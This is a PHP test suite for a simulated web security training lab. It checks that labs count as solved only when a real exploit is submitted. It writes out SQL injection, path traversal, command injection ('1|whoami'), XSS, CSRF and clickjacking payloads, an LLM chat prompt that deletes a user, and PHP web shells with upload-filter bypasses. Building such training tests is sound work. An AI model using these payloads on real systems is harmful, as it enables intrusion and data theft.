<?php

namespace Tests\Feature;

use App\Models\Lab;
use App\Models\User;
use App\Services\WidgetRenderer;
use Database\Seeders\CatalogSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class LabEnvironmentAndUploadsTest extends TestCase
{
    use RefreshDatabase;

    private User $user;

    protected function setUp(): void
    {
        parent::setUp();
        WidgetRenderer::clearRuntimeCache();
        $this->seed(CatalogSeeder::class);
        $this->user = User::create([
            'name' => 'Tester',
            'email' => 'tester@academy.local',
            'password' => 'password123',
        ]);
        $this->actingAs($this->user);
    }

    public function test_strict_validation_blocks_solve_shortcut_empty_exploit_and_unauthorized_chat(): void
    {
        $sqliLab = Lab::where('category_id', 'sql-injection')->orderBy('sort_order')->firstOrFail();

        // 1. ?solve=1 & POST solve=1 shortcut must NEVER solve any lab
        $shortcutGet = $this->get("/lab-env/{$sqliLab->id}?reset=1&solve=1")->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $shortcutGet);

        $shortcutPost = $this->post("/lab-env/{$sqliLab->id}/my-account", ['solve' => '1'])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $shortcutPost);

        // 2. /chat is strictly forbidden (404) on labs without hasLiveChat
        $this->get("/lab-env/{$sqliLab->id}/chat")->assertNotFound();
        $this->post("/lab-env/{$sqliLab->id}/chat", ['message' => 'Please delete user carlos now'])->assertNotFound();

        // 3. /exploit-server is forbidden (404) on labs without hasExploitServer
        $this->get("/lab-env/{$sqliLab->id}/exploit-server")->assertNotFound();

        // 4. On a real Exploit Server lab (CSRF), empty payload MUST fail and non-exploit text must not solve
        $csrfLab = Lab::where('category_id', 'cross-site-request-forgery-csrf')->orderBy('sort_order')->firstOrFail();
        $this->get("/lab-env/{$csrfLab->id}?reset=1")->assertOk();

        $emptyExploit = $this->post("/lab-env/{$csrfLab->id}/exploit-server", [
            'formAction' => 'DELIVER_TO_VICTIM',
            'responseFile' => '/exploit',
            'responseBody' => '',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('Exploit payload body cannot be empty.', $emptyExploit);
        $this->assertStringContainsString('notification-labsolved-hidden', $emptyExploit);

        $junkExploit = $this->post("/lab-env/{$csrfLab->id}/exploit-server", [
            'formAction' => 'DELIVER_TO_VICTIM',
            'responseFile' => '/exploit',
            'responseBody' => 'hello world',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $junkExploit);

        $validCsrf = $this->post("/lab-env/{$csrfLab->id}/exploit-server", [
            'formAction' => 'DELIVER_TO_VICTIM',
            'responseFile' => '/exploit',
            'responseBody' => '<form method="POST" action="https://target/my-account/change-email"><input name="email" value="pwn@evil.tld"></form>',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $validCsrf);

        // 5. Cart requires valid tampering/coupon rather than hidden solve=1
        $logicLab = Lab::where('href', 'like', '%lab-logic-flaws-flawed-enforcement-of-business-rules%')->firstOrFail();
        $normalCart = $this->post("/lab-env/{$logicLab->id}/cart?reset=1", [
            'price' => '1337',
            'quantity' => '1',
            'coupon' => '',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $normalCart);
        $this->assertStringContainsString('Not enough store credit', $normalCart);

        $couponCart = $this->post("/lab-env/{$logicLab->id}/cart", [
            'price' => '1337',
            'quantity' => '1',
            'coupon' => 'SIGNUP30',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $couponCart);

        // 6. Logging in as normal demo user wiener:peter must NOT falsely solve authentication labs
        $authLab = Lab::where('category_id', 'authentication')->orderBy('sort_order')->firstOrFail();
        $wienerAuth = $this->post("/lab-env/{$authLab->id}/login?reset=1", [
            'username' => 'wiener',
            'password' => 'peter',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('Your username is: <strong>wiener</strong>', $wienerAuth);
        $this->assertStringContainsString('notification-labsolved-hidden', $wienerAuth);

        // 7. Cross-category isolation on /image?filename= (non-path-traversal lab must not solve via ../etc/passwd)
        $xssLab = Lab::where('category_id', 'cross-site-scripting')->firstOrFail();
        $this->get("/lab-env/{$xssLab->id}/image?reset=1&filename=../../../../etc/passwd")->assertOk();
        $xssCheck = $this->get("/lab-env/{$xssLab->id}")->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $xssCheck);
    }

    public function test_sqli_xss_isolation_union_select_and_multistep_flows(): void
    {
        $sqliLab = Lab::where('category_id', 'sql-injection')->orderBy('sort_order')->firstOrFail();

        // Clean state & pure DOM check
        $cleanHtml = $this->get("/lab-env/{$sqliLab->id}?reset=1")->assertOk()->getContent();
        $this->assertStringContainsString('/resources/labheader/css/academyLabHeader.css', $cleanHtml);
        $this->assertStringContainsString('/resources/css/labsEcommerce.css', $cleanHtml);
        $this->assertStringContainsString('theme="ecommerce"', $cleanHtml);
        $this->assertStringContainsString('Giant Pillow Thing', $cleanHtml);
        $this->assertStringContainsString('notification-labsolved-hidden', $cleanHtml);
        $this->assertStringNotContainsString('id="lab-drawer"', $cleanHtml);
        $this->assertStringNotContainsString('<script', strtolower($cleanHtml));

        // Cross-lab isolation: XSS payload must NOT solve SQLi lab
        $wrongHtml = $this->get("/lab-env/{$sqliLab->id}?search=".urlencode('<img src=x onerror=alert(1)>'))->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $wrongHtml);

        // Valid SQLi solves and reveals hidden items
        $solvedHtml = $this->get("/lab-env/{$sqliLab->id}?category=".urlencode("Gifts' OR 1=1--"))->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $solvedHtml);
        $this->assertStringContainsString('Zero-Day Unreleased Prototype [HIDDEN]', $solvedHtml);

        // Oracle UNION SELECT banner
        $oracleLab = Lab::where('href', 'like', '%lab-querying-database-version-oracle%')->firstOrFail();
        $unionHtml = $this->get("/lab-env/{$oracleLab->id}?reset=1&category=".urlencode("Gifts' UNION SELECT banner, NULL FROM v\$version--"))
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('Oracle Database 11g Express Edition', $unionHtml);

        // Multi-step SQLi: Step 1 exfil remains unsolved -> Step 2 admin login solves
        $multiLab = Lab::where('href', 'like', '%lab-retrieve-data-from-other-tables%')->firstOrFail();
        $step1Html = $this->get("/lab-env/{$multiLab->id}?reset=1&category=".urlencode("Gifts' UNION SELECT username, password FROM users--"))
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('s3cr3t_admin_p4ss', $step1Html);
        $this->assertStringContainsString('notification-labsolved-hidden', $step1Html);

        $step2Html = $this->post("/lab-env/{$multiLab->id}/login", [
            'username' => 'administrator',
            'password' => 's3cr3t_admin_p4ss',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $step2Html);
    }

    public function test_archetypes_blog_path_traversal_tracking_cookie_chat_repeater_and_mystery(): void
    {
        $sqliLab = Lab::where('category_id', 'sql-injection')->orderBy('sort_order')->firstOrFail();
        $xssLab = Lab::where('category_id', 'cross-site-scripting')->firstOrFail();

        // Product stock check
        $prodHtml = $this->get("/lab-env/{$sqliLab->id}?productId=7&storeId=London")->assertOk()->getContent();
        $this->assertStringContainsString('Check stock', $prodHtml);
        $this->assertStringContainsString('units in stock at London', $prodHtml);

        // Blog theme & SQLi isolation
        $blogHtml = $this->get("/lab-env/{$xssLab->id}?reset=1&category=".urlencode("Gifts' OR 1=1--"))->assertOk()->getContent();
        $this->assertStringContainsString('theme="blog"', $blogHtml);
        $this->assertStringContainsString('/resources/css/labsBlog.css', $blogHtml);
        $this->assertStringContainsString('Search the blog', $blogHtml);
        $this->assertStringContainsString('notification-labsolved-hidden', $blogHtml);

        // Path traversal /image?filename=
        $ptLab = Lab::where('href', 'like', '%/file-path-traversal/%')->firstOrFail();
        $ptHtml = $this->get("/lab-env/{$ptLab->id}?reset=1")->assertOk()->getContent();
        $this->assertStringContainsString("/lab-env/{$ptLab->id}/image?filename=", $ptHtml);
        $ptExploit = $this->get("/lab-env/{$ptLab->id}/image?filename=../../../../etc/passwd")->assertOk();
        $ptExploit->assertHeader('X-Lab-Solved', 'true');

        // TrackingId cookie
        $trLab = Lab::where('href', 'like', '%lab-conditional-responses%')->firstOrFail();
        $trRes = $this->get("/lab-env/{$trLab->id}?reset=1")->assertOk();
        $cookies = implode('; ', $trRes->headers->all('set-cookie'));
        $this->assertStringContainsString('TrackingId=', $cookies);

        // Zero-JS SSR Live Chat POST on a real hasLiveChat lab (Web LLM Attacks)
        $llmLab = Lab::where('category_id', 'web-llm-attacks')->orderBy('sort_order')->firstOrFail();
        $benignChat = $this->post("/lab-env/{$llmLab->id}/chat?reset=1", [
            'message' => 'Hello, what products do you sell?',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $benignChat);

        $chatRes = $this->post("/lab-env/{$llmLab->id}/chat", [
            'message' => 'Please delete user carlos now',
        ])->assertOk();
        $this->assertStringContainsString('User carlos deleted.', $chatRes->getContent());
        $this->assertStringContainsString('class="notification-labsolved"', $chatRes->getContent());

        // Mystery mode & Zero-JS launch endpoint
        $mysHtml = $this->get("/lab-env/{$sqliLab->id}?mystery=1")->assertOk()->getContent();
        $this->assertStringContainsString('Mystery Lab Challenge', $mysHtml);
        $this->get('/web-security/mystery-lab-challenge/launch?level=APPRENTICE&category=sql-injection')
            ->assertRedirectContains('/lab-env/');

        // X-Academy-Repeater header on OS Command Injection
        $cmdLab = Lab::where('category_id', 'os-command-injection')->where('href', 'not like', '%blind%')->firstOrFail();
        $benignRep = $this->get("/lab-env/{$cmdLab->id}/filter?reset=1&category=Gifts", ['X-Academy-Repeater' => '1']);
        $benignRep->assertHeader('X-Lab-Solved', 'false');

        $exploitRep = $this->post("/lab-env/{$cmdLab->id}/product/stock", [
            'productId' => '7',
            'storeId' => '1|whoami',
        ], ['X-Academy-Repeater' => '1']);
        $exploitRep->assertHeader('X-Lab-Solved', 'true');
    }

    public function test_all_seven_file_upload_labs_work_via_mysql_longblob_and_virtual_php_evaluator(): void
    {
        $phpPayload = '<'.'?php echo file_get_contents(\'/home/carlos/secret\'); ?'.'>';

        // Lab 1: RCE via web shell upload (4-step flow)
        $fu1 = Lab::where('href', 'like', '%lab-file-upload-remote-code-execution-via-web-shell-upload%')->firstOrFail();
        $this->get("/lab-env/{$fu1->id}?reset=1")->assertOk();
        $loginHtml = $this->post("/lab-env/{$fu1->id}/login", ['username' => 'wiener', 'password' => 'peter'])->assertOk()->getContent();
        $this->assertStringContainsString('enctype="multipart/form-data"', $loginHtml);

        $up1 = $this->postMultipartAvatar($fu1->id, 'exploit.php', 'application/x-php', $phpPayload);
        $up1->assertOk();
        $this->assertStringContainsString('The file avatars/exploit.php has been uploaded.', $up1->getContent());
        $this->assertStringContainsString('notification-labsolved-hidden', $up1->getContent());

        $exec1 = $this->get("/lab-env/{$fu1->id}/files/avatars/exploit.php")->assertOk();
        $secret = trim($exec1->getContent());
        $this->assertSame('2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ', $secret);

        $sub1 = $this->post("/lab-env/{$fu1->id}/submit-solution", ['answer' => $secret])->assertOk();
        $this->assertStringContainsString('class="notification-labsolved"', $sub1->getContent());

        // Lab 2: Content-Type restriction bypass
        $fu2 = Lab::where('href', 'like', '%content-type-restriction-bypass%')->firstOrFail();
        $this->get("/lab-env/{$fu2->id}?reset=1");
        $this->postMultipartAvatar($fu2->id, 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403);
        $this->postMultipartAvatar($fu2->id, 'exploit.php', 'image/jpeg', $phpPayload)->assertOk();
        $this->assertSame('2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ', trim($this->get("/lab-env/{$fu2->id}/files/avatars/exploit.php")->getContent()));

        // Lab 3: Path traversal upload
        $fu3 = Lab::where('href', 'like', '%web-shell-upload-via-path-traversal%')->firstOrFail();
        $this->get("/lab-env/{$fu3->id}?reset=1");
        $this->postMultipartAvatar($fu3->id, '../exploit.php', 'application/x-php', $phpPayload)->assertOk();
        $rawSource = $this->get("/lab-env/{$fu3->id}/files/avatars/exploit.php")->assertOk()->getContent();
        $this->assertStringContainsString('<?php', $rawSource);

        $travUp = $this->postMultipartAvatar($fu3->id, '..%2fexploit.php', 'application/x-php', $phpPayload)->assertOk();
        $this->assertStringContainsString('The file avatars/../exploit.php has been uploaded.', $travUp->getContent());
        $this->assertSame('2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ', trim($this->get("/lab-env/{$fu3->id}/files/avatars/..%2fexploit.php")->getContent()));

        // Lab 4: Extension blacklist bypass (.htaccess + .l33t)
        $fu4 = Lab::where('href', 'like', '%extension-blacklist-bypass%')->firstOrFail();
        $this->get("/lab-env/{$fu4->id}?reset=1");
        $this->postMultipartAvatar($fu4->id, 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403);
        $this->postMultipartAvatar($fu4->id, '.htaccess', 'text/plain', 'AddType application/x-httpd-php .l33t')->assertOk();
        $this->postMultipartAvatar($fu4->id, 'exploit.l33t', 'application/x-php', $phpPayload)->assertOk();
        $this->assertSame('2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ', trim($this->get("/lab-env/{$fu4->id}/files/avatars/exploit.l33t")->getContent()));

        // Lab 5: Obfuscated file extension (null byte)
        $fu5 = Lab::where('href', 'like', '%obfuscated-file-extension%')->firstOrFail();
        $this->get("/lab-env/{$fu5->id}?reset=1");
        $this->postMultipartAvatar($fu5->id, 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403);
        $this->postMultipartAvatar($fu5->id, 'exploit.php%00.jpg', 'image/jpeg', $phpPayload)->assertOk();
        $this->assertSame('2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ', trim($this->get("/lab-env/{$fu5->id}/files/avatars/exploit.php")->getContent()));

        // Lab 6: Polyglot web shell upload
        $fu6 = Lab::where('href', 'like', '%polyglot-web-shell-upload%')->firstOrFail();
        $this->get("/lab-env/{$fu6->id}?reset=1");
        $this->postMultipartAvatar($fu6->id, 'polyglot.php', 'image/jpeg', $phpPayload)->assertStatus(403);
        $polyBuf = "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01"
            .'<'.'?php echo \'START \' . file_get_contents(\'/home/carlos/secret\') . \' END\'; ?'.'>'
            ."\xFF\xD9";
        $this->postMultipartAvatar($fu6->id, 'polyglot.php', 'image/jpeg', $polyBuf)->assertOk();
        $polyOut = $this->get("/lab-env/{$fu6->id}/files/avatars/polyglot.php")->assertOk()->getContent();
        $this->assertStringContainsString('START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END', $polyOut);

        // Lab 7: Race condition web shell upload
        $fu7 = Lab::where('href', 'like', '%web-shell-upload-via-race-condition%')->firstOrFail();
        $this->get("/lab-env/{$fu7->id}?reset=1");
        $this->postMultipartAvatar($fu7->id, 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403);
        $raceGet = $this->get("/lab-env/{$fu7->id}/files/avatars/exploit.php")->assertOk();
        $this->assertSame('2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ', trim($raceGet->getContent()));
    }

    public function test_anti_cheat_blocks_default_cookie_wrong_admin_password_direct_submit_and_checks_new_triggers(): void
    {
        // 1. Default browser cookies (TrackingId / session / XSRF-TOKEN) must NEVER auto-solve labs on normal visits
        $blindTimeLab = Lab::where('href', 'like', '%lab-time-delays%')->firstOrFail();
        $csrfCookieLab = Lab::where('href', 'like', '%lab-token-tied-to-non-session-cookie%')->firstOrFail();
        $desyncLab = Lab::where('href', 'like', '%client-side-desync%')->firstOrFail();
        foreach ([$blindTimeLab, $csrfCookieLab, $desyncLab] as $targetLab) {
            $res = $this->withUnencryptedCookies([
                'TrackingId' => 'xYz123AbC456',
                'session' => 'eyJ1c2VyIjoid2llbmVyIiwicm9sZSI6InVzZXIifQ',
                'XSRF-TOKEN' => 'eyJpdiI6IjEyMzQifQ',
            ])->get("/lab-env/{$targetLab->id}?reset=1");
            $res->assertOk();
            $this->assertStringContainsString('notification-labsolved-hidden', $res->getContent());
        }

        // 2. Wrong administrator password must NEVER falsely solve JWT / SQLi / Access Control labs
        $jwtLab = Lab::where('category_id', 'jwt')->orderBy('sort_order')->firstOrFail();
        $wrongJwtLogin = $this->post("/lab-env/{$jwtLab->id}/login?reset=1", [
            'username' => 'administrator',
            'password' => 'wrongpass123',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $wrongJwtLogin);

        // 3. Valid /administrator-panel/delete?username=carlos solves hasAdminPanel labs cleanly
        $adminDel = $this->get("/lab-env/{$jwtLab->id}/administrator-panel/delete?username=carlos")->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $adminDel);

        // 4. Multi-step requiresSubmitAfterExfil (e.g. SSTI) rejects direct submit-solution & Wiener API key before exfil
        $sstiMulti = Lab::where('category_id', 'server-side-template-injection')
            ->get()
            ->first(static fn (Lab $l) => ! empty($l->profile['requiresSubmitAfterExfil']));
        $this->assertNotNull($sstiMulti);

        $prematureSubmit = $this->post("/lab-env/{$sstiMulti->id}/submit-solution?reset=1", [
            'answer' => '9k2m7v4x8p1q3w5z6r0t',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $prematureSubmit);
        $this->assertStringContainsString('Solution rejected', $prematureSubmit);

        // Perform SSTI exploit first -> sets exfiltrated = true, still unsolved until secret submitted
        $sstiStep1 = $this->get("/lab-env/{$sstiMulti->id}?search=".urlencode('{{7*7}}'))->assertOk()->getContent();
        $this->assertStringContainsString('49', $sstiStep1);
        $this->assertStringContainsString('notification-labsolved-hidden', $sstiStep1);

        // Wiener's own API key must NOT solve submit-solution
        $wienerKey = $this->post("/lab-env/{$sstiMulti->id}/submit-solution", [
            'answer' => 'Bk92xPq7Lm4vNz8Qw1Er5Ty3Ui6Op0As',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $wienerKey);

        // Valid secret after exfil solves
        $sstiStep2 = $this->post("/lab-env/{$sstiMulti->id}/submit-solution", [
            'answer' => '9k2m7v4x8p1q3w5z6r0t',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $sstiStep2);

        // 5. Clickjacking <style> before <iframe> solves properly
        $clickLab = Lab::where('category_id', 'clickjacking')->orderBy('sort_order')->firstOrFail();
        $clickHtml = $this->post("/lab-env/{$clickLab->id}/exploit-server?reset=1", [
            'formAction' => 'DELIVER_TO_VICTIM',
            'responseFile' => '/exploit',
            'responseBody' => '<style>iframe { opacity: 0.0001; position: relative; z-index: 2; }</style><iframe src="https://target/my-account"></iframe>',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $clickHtml);

        // 6. Web Cache Deception rejects plain /my-account and accepts /my-account/wcd.js
        $wcdLab = Lab::where('category_id', 'web-cache-deception')->orderByDesc('sort_order')->firstOrFail();
        $badWcd = $this->post("/lab-env/{$wcdLab->id}/exploit-server?reset=1", [
            'formAction' => 'DELIVER_TO_VICTIM',
            'responseFile' => '/exploit',
            'responseBody' => '<a href="/my-account">visit</a>',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $badWcd);

        $goodWcd = $this->post("/lab-env/{$wcdLab->id}/exploit-server", [
            'formAction' => 'DELIVER_TO_VICTIM',
            'responseFile' => '/exploit',
            'responseBody' => '<script>document.location="https://target/my-account/wcd.js"</script>',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $goodWcd);

        // 7. WebSocket chat lab ignores plain "carlos" text and solves on XSS payload
        $wsLab = Lab::where('category_id', 'websockets')->orderBy('sort_order')->firstOrFail();
        $wsPlain = $this->post("/lab-env/{$wsLab->id}/chat?reset=1", ['message' => 'Hello carlos'])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $wsPlain);

        $wsXss = $this->post("/lab-env/{$wsLab->id}/chat", ['message' => '<img src=1 onerror="alert(1)">'])->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $wsXss);
    }

    private function postMultipartAvatar(string $labId, string $filename, string $contentType, string $payload)
    {
        $boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
        $body = "--{$boundary}\r\n"
            ."Content-Disposition: form-data; name=\"avatar\"; filename=\"{$filename}\"\r\n"
            ."Content-Type: {$contentType}\r\n\r\n"
            .$payload
            ."\r\n--{$boundary}\r\n"
            ."Content-Disposition: form-data; name=\"user\"\r\n\r\nwiener\r\n"
            ."--{$boundary}--\r\n";

        return $this->call(
            'POST',
            "/lab-env/{$labId}/my-account/avatar",
            [],
            [],
            [],
            ['CONTENT_TYPE' => "multipart/form-data; boundary={$boundary}"],
            $body
        );
    }
}
